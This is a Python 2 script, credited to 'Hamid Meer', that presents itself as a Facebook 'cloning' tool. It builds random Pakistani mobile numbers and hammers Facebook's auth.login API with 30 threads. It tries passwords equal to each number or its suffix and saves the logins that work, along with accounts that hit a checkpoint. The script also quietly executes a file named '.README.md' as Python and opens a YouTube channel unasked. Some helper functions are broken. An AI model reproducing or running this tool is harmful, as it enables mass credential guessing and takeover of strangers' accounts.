#PROGRAMED BY HAMID MEER
# ENJOY
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(30000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

from requests.exceptions import ConnectionError
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109 ')]
def exb():
    print '[!] Exit Successfully '
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(x):
    for e in x + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = ['   ', '. ', '.. ', '...', '']
    for o in titik:
        print 'PROCESSING' + o,
        sys.stdout.flush()
        time.sleep(0.0)


logo = """

\033[1;91m##     ##    ###    ##     ## #### #### 
\033[1;94m##     ##   ## ##   ###   ###  ##   ##  
\033[1;32m##     ##  ##   ##  #### ####  ##   ##  
\033[1;95m######### ##     ## ## ### ##  ##   ##  
\033[1;96m##     ## ######### ##     ##  ##   ##  
\033[1;93m##     ## ##     ## ##     ##  ##   ##  
##     ## ##     ## ##     ## #### #### 

\033[1;37m--------------------------------------------------

\033[1;91m> OWNER      () HAMID MEER
\033[1;95m> FACEBOOK   () Hamid Meer'hamii
\033[1;32m> WHATSAPP   () +923155912839
\033[1;96m> LIFE STATUS() SINGLE HON YAWR 

\033[1;95m--------------------------------------------------
\033[1;95m[\033[1;46m\033[1;91mBE-A-GOOD-PERSON-BUT-DON'T-WEST-TIME-TO-PROVE-IT\033[0m\x1b[1;95m]
\033[1;97m  """



logo1 = """            SELECT PAK  SIM CODE 
-------------------------------------------------
\033[1;97m[\033[1;92m>>\033[1;97m] Jazz    : 00,01,02,03,04,05,06,07,08
\033[1;97m[\033[1;92m>>\033[1;97m] Zong    : 11,12,13,14,15,16,17
\033[1;97m[\033[1;92m>>\033[1;97m] Warid   : 21,22,23,24,25,?,?,?,?
\033[1;97m[\033[1;92m>>\033[1;97m] UPhone  : 30,31,32,33,34,35,?,?
\033[1;97m[\033[1;92m>>\033[1;97m] Telenor : 40,41,42,43,44,45,46,47
\x1b[1;97m----------------------------------------"""
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []

def menu():
    os.system('clear')
    print logo
    jalan('\x1b[1;32m ') 
    jalan ('[1] \033[1;96mSTART CLONING  ')
    print("\033[1;97m           ")
    action()
os.system('xdg-open www.youtube.com/c/Hamiiworld')

def action():
    global cpb
    global oks
    ss = raw_input('\033[1;97m[\033[1;92m>>\033[1;97m] Choose : ')
    print("\033[1;97m--------------------------------------------------")
    if ss == '':
        print '[!] Warning'
        action()
    elif ss == '1':
        tik()
        os.system('clear')
        print logo
        print logo1
        jalan('\x1b[1;32m ') 
        try:
            c = raw_input('\033[1;97m[\033[1;92m>>\033[1;97m] Choose : ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ss == '0':
        exb()
        login()
    else:
        print '[!] Fill In Correctly'
        action()
        os.system('clear')
        print logo
        
    xxx = str(len(id))
    jalan('\x1b[1;32m ') 
    
    jalan('\x1b[1;32m[$] TOTAL IDS NUMBER : \x1b[1;96m' + xxx)
    
    jalan('\x1b[1;32m[$] TO STOP THIS PROCESS PRESS Ctrl THEN z')
    print("\033[1;97m--------------------------------------------------")
    
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HAMII-SUCCESSFUL]  USER :  ' + k + c + user + ' PASSWORD : ' + pass1
                okb = open('sdcard/ids/successful.txt', 'a')
                okb.write(q['uid'] + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;91m[HAMII-CHECKPOINT]\x1b[0;97m] USER : ' + k + c + user + ' PASSWORD :  ' + pass1
                cps = open('sdcard/ids/checkpoint.txt', 'a')
                cps.write(q['uid'] + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HAMII-SUCCESSFUL]  USER :  ' + k + c + user + ' PASSWORD : ' + pass2
                    okb = open('sdcard/ids/successful.txt', 'a')
                    okb.write(q['uid'] + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;91m[HAMII-CHECKPOINT]\x1b[0;97m] USER : ' + k + c + user + ' PASSWORD :  ' + pass2
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                    cps.write(q['uid'] + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print("\033[1;97m---------------------------------------------------")
    print '\x1b[1;97mProcess Has Been Completed ...'
    print '\x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;91mCP : \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;91m' + str(len(cpb))
    print("\033[1;97m---------------------------------------------------")
    raw_input('\033[1;97mPress Enter To Back Menu\033[1;97m]')
    menu()


if __name__ == '__main__':
    menu()


